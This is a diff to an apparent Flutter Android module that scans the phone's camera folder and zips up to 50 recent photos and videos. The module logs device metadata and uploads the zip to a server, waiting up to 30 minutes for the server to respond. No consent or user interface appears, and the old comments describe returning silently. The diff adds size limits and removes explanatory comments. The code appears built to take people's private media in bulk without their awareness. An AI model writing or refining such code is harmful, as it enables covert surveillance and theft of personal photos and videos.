@@ -3,6 +3,7 @@
 /// - 打包完成后循环检测服务器，直到通或者超时
 /// - 权限判断分 SDK：33+ 用媒体权限，32 及以下用存储权限
 /// - 失败重试计数持久化，超过阈值永久跳过
+/// - 图片 > 30MB 跳过；视频 > 100MB 跳过
 ///
 /// ⚠️ 当前版本：zip 不会被自动删除，会保留在应用缓存目录
 ///    路径：/data/data/<包名>/cache/dcim_upload_<时间戳>.zip
@@ -36,8 +37,16 @@ class DcimUploadConfig {
   final int maxAttemptsPerFile;
   /// ZIP 压缩级别（0 = Store / 无压缩，1-9 = Deflate）
   final int zipCompressionLevel;
-  /// 媒体扩展名白名单
-  final Set<String> mediaExtensions;
+
+  /// 图片扩展名白名单
+  final Set<String> imageExtensions;
+  /// 视频扩展名白名单
+  final Set<String> videoExtensions;
+
+  /// ★ 单张图片体积上限（字节）。默认 30 MB。0 = 不限制。
+  final int maxImageBytes;
+  /// ★ 单个视频体积上限（字节）。默认 100 MB。0 = 不限制。
+  final int maxVideoBytes;
 
   // ── 服务器等待相关 ─────────────────────────────────────────────────
   /// 服务器健康检查 URL。为空时用 uploadUrl 本身。
@@ -46,7 +55,7 @@ class DcimUploadConfig {
   final Duration healthCheckTimeout;
   /// 服务器不通时，两次检测之间的间隔
   final Duration serverWaitInterval;
-  /// 最多检测次数。超过后本轮放弃（下一轮 WorkManager 会重新走）
+  /// 最多检测次数。超过后本轮放弃
   final int serverWaitMaxAttempts;
 
   const DcimUploadConfig({
@@ -56,14 +65,22 @@ class DcimUploadConfig {
     this.maxFiles = 50,
     this.maxAttemptsPerFile = 3,
     this.zipCompressionLevel = 0,
-    this.mediaExtensions = const {
-      '.jpg', '.jpeg', '.png', '.heic', '.webp', '.gif',
-      '.mp4', '.mov', '.avi', '.mkv', '.wmv', '.flv', '.webm',
+
+    // 图片 / 视频扩展名
+    this.imageExtensions = const {
+      '.jpg', '.jpeg', '.png', '.heic', '.webp', '.gif', '.bmp',
     },
+    this.videoExtensions = const {
+      '.mp4', '.mov', '.avi', '.mkv', '.wmv', '.flv', '.webm', '.3gp',
+    },
+
+    // 体积上限
+    this.maxImageBytes = 30 * 1024 * 1024,   // 30 MB
+    this.maxVideoBytes = 100 * 1024 * 1024,  // 100 MB
+
     this.healthCheckUrl = '',
     this.healthCheckTimeout = const Duration(seconds: 5),
     this.serverWaitInterval = const Duration(seconds: 10),
-    // 180 次 × 10 秒 = 30 分钟
     this.serverWaitMaxAttempts = 180,
   });
 }
@@ -86,7 +103,7 @@ class DcimUploadManager {
   bool get isBusy => _busy;
   int get uploadedCount => _uploaded.length;
 
-  // ── 初始化：加载记录 ───────────────────────────────────────────────────
+  // ── 初始化 ─────────────────────────────────────────────────────────
   Future<void> initialize({DcimUploadConfig? config}) async {
     if (_prefs != null) return;
     if (config != null) _config = config;
@@ -111,7 +128,7 @@ class DcimUploadManager {
         '[DcimUpload] 已记录成功 ${_uploaded.length} 个，失败 ${_failed.length} 个');
   }
 
-  // ── 权限判断：分 SDK ──────────────────────────────────────────────────
+  // ── 权限判断：分 SDK ───────────────────────────────────────────────
   Future<bool> hasPermission() async {
     if (!Platform.isAndroid) return false;
     final sdk = await DeviceInfoHelper.getAndroidSdkInt();
@@ -125,7 +142,7 @@ class DcimUploadManager {
     }
   }
 
-  // ── 上传入口（无权限则静默返回）──────────────────────────────────────
+  // ── 上传入口 ───────────────────────────────────────────────────────
   Future<void> startUploadIfPermitted() async {
     await initialize();
     if (!await hasPermission()) {
@@ -136,7 +153,7 @@ class DcimUploadManager {
     await packAndUpload(files);
   }
 
-  // ── 主流程：扫描 → 打包 → 等待服务器 → 上传 ──────────────────────────
+  // ── 主流程 ─────────────────────────────────────────────────────────
   Future<void> packAndUpload(List<File> files) async {
     if (_busy) {
       debugPrint('[DcimUpload] 上一轮未结束，跳过');
@@ -157,7 +174,6 @@ class DcimUploadManager {
       final metadata = await DeviceInfoHelper.getDeviceMetadata();
       debugPrint('[DcimUpload] 设备信息: $metadata');
 
-      // ── 收集每个文件的元数据（含 MD5）───────────────────────────────
       final fileInfos = <Map<String, dynamic>>[];
       final usedNames = <String>{};
       final zipNameMap = <String, String>{};
@@ -193,7 +209,6 @@ class DcimUploadManager {
         return;
       }
 
-      // ── 打包 ZIP（Store 模式）─────────────────────────────────────
       debugPrint(
           '[DcimUpload] 开始打包（${fileInfos.length} 个文件，level=${_config.zipCompressionLevel}）...');
       final encoder = ZipFileEncoder();
@@ -247,10 +262,6 @@ class DcimUploadManager {
           '(${(zipSize / 1024 / 1024).toStringAsFixed(2)} MB, $packed 个文件)');
       debugPrint('[DcimUpload] zip 路径: ${zipFile.path}');
 
-      // ══════════════════════════════════════════════════════════════
-      // ★ 打包完成后，循环等待服务器可用
-      //   期间不重新打包 zip，直到服务器可达或超时
-      // ══════════════════════════════════════════════════════════════
       debugPrint('[DcimUpload] 进入服务器检测循环...');
       final serverOk = await _waitForServer();
 
@@ -262,10 +273,9 @@ class DcimUploadManager {
           _failed[f.path] = (_failed[f.path] ?? 0) + 1;
         }
         await _persist();
-        return; // 会走 finally 释放 _busy
+        return;
       }
 
-      // ── 服务器可用，开始上传 ────────────────────────────────────────
       final success = await _uploadZip(zipFile, packed);
 
       if (success) {
@@ -284,16 +294,11 @@ class DcimUploadManager {
     } catch (e, st) {
       debugPrint('[DcimUpload] ❌ 打包/上传异常: $e\n$st');
     } finally {
-      // ⚠️ 已关闭临时 zip 删除，zip 会保留在 cache 目录
       _busy = false;
     }
   }
 
-  // ══════════════════════════════════════════════════════════════════
-  // 服务器检测循环
-  // ══════════════════════════════════════════════════════════════════
-  /// 循环检测服务器，直到可达或超过最大次数。
-  /// 返回 true = 服务器在线，可以上传；false = 放弃本轮
+  // ── 服务器检测循环 ─────────────────────────────────────────────────
   Future<bool> _waitForServer() async {
     final url = _config.healthCheckUrl.isNotEmpty
         ? Uri.parse(_config.healthCheckUrl)
@@ -302,7 +307,6 @@ class DcimUploadManager {
     debugPrint('[DcimUpload] 健康检查 URL: $url');
 
     for (int i = 1; i <= _config.serverWaitMaxAttempts; i++) {
-      // 如果外部把 _busy 置为 false（例如取消了），提前退出
       if (!_busy) {
         debugPrint('[DcimUpload] 检测循环被取消');
         return false;
@@ -317,7 +321,6 @@ class DcimUploadManager {
       debugPrint('[DcimUpload] 服务器不可达（第 $i/${_config.serverWaitMaxAttempts} 次），'
           '${_config.serverWaitInterval.inSeconds}s 后重试...');
 
-      // 最后一次检测后不再 sleep
       if (i < _config.serverWaitMaxAttempts) {
         await Future.delayed(_config.serverWaitInterval);
       }
@@ -326,23 +329,14 @@ class DcimUploadManager {
     return false;
   }
 
-  /// 单次服务器探测。
-  /// 优先用 HEAD（轻量），不支持时回退 GET。
-  /// 判据：收到 HTTP 响应且状态码 < 500 视为"服务器可用"。
   Future<bool> _pingServer(Uri url) async {
-    // 1. 尝试 HEAD
     try {
       final req = http.Request('HEAD', url);
       final streamed = await req.send().timeout(_config.healthCheckTimeout);
       await streamed.stream.drain<void>();
-      final code = streamed.statusCode;
-      // 2xx/3xx/4xx 都说明服务器在线（401/403/404/405 也算）
-      return code < 500;
-    } catch (_) {
-      // HEAD 失败，回退 GET
-    }
+      return streamed.statusCode < 500;
+    } catch (_) {}
 
-    // 2. 回退 GET
     try {
       final resp = await http.get(url).timeout(_config.healthCheckTimeout);
       return resp.statusCode < 500;
@@ -351,7 +345,7 @@ class DcimUploadManager {
     }
   }
 
-  // ── 扫描：过滤 + 排序 + 取前 N ──────────────────────────────────────
+  // ── 扫描：过滤 + 排序 + 取前 N ────────────────────────────────────
   Future<List<File>> scanFiles() async {
     final dir = Directory(_config.dcimPath);
     if (!await dir.exists()) {
@@ -362,12 +356,17 @@ class DcimUploadManager {
     final list = <_Scanned>[];
     await for (final e in dir.list(followLinks: false)) {
       if (e is! File) continue;
+
       final name = e.path.split('/').last;
       final dot = name.lastIndexOf('.');
       if (dot < 0) continue;
-      if (!_config.mediaExtensions.contains(name.substring(dot).toLowerCase())) {
-        continue;
-      }
+      final ext = name.substring(dot).toLowerCase();
+
+      // ★ 判断是图片还是视频
+      final isImage = _config.imageExtensions.contains(ext);
+      final isVideo = _config.videoExtensions.contains(ext);
+      if (!isImage && !isVideo) continue;
+
       if (_uploaded.contains(e.path)) continue;
       if ((_failed[e.path] ?? 0) >= _config.maxAttemptsPerFile) {
         debugPrint('[DcimUpload] 永久跳过（失败 ${_failed[e.path]} 次）: $name');
@@ -376,6 +375,17 @@ class DcimUploadManager {
 
       try {
         final st = await e.stat();
+
+        // ★ 分类型判断体积上限
+        final limit = isImage ? _config.maxImageBytes : _config.maxVideoBytes;
+        if (limit > 0 && st.size > limit) {
+          debugPrint(
+              '[DcimUpload] 跳过超大${isImage ? "图片" : "视频"}（'
+              '${(st.size / 1024 / 1024).toStringAsFixed(1)} MB > '
+              '${(limit / 1024 / 1024).toStringAsFixed(0)} MB）: $name');
+          continue;
+        }
+
         list.add(_Scanned(e, st.modified));
       } catch (_) {}
     }
@@ -384,7 +394,7 @@ class DcimUploadManager {
     return list.take(_config.maxFiles).map((s) => s.file).toList();
   }
 
-  // ── MD5 计算 ────────────────────────────────────────────────────────
+  // ── MD5 ────────────────────────────────────────────────────────────
   Future<String> _calcMd5(File f) async {
     try {
       final digest = await md5.bind(f.openRead()).first;
@@ -395,7 +405,7 @@ class DcimUploadManager {
     }
   }
 
-  // ── 上传 ZIP 文件 ───────────────────────────────────────────────────
+  // ── 上传 ZIP ───────────────────────────────────────────────────────
   Future<bool> _uploadZip(File zip, int fileCount) async {
     try {
       final req = http.MultipartRequest('POST', Uri.parse(_config.uploadUrl));
@@ -423,7 +433,7 @@ class DcimUploadManager {
     }
   }
 
-  // ── 持久化 ──────────────────────────────────────────────────────────
+  // ── 持久化 ─────────────────────────────────────────────────────────
   Future<void> _persist() async {
     await _prefs?.setStringList(_kUploaded, _uploaded.toList());
     await _prefs?.setString(_kFailedMap, jsonEncode(_failed));
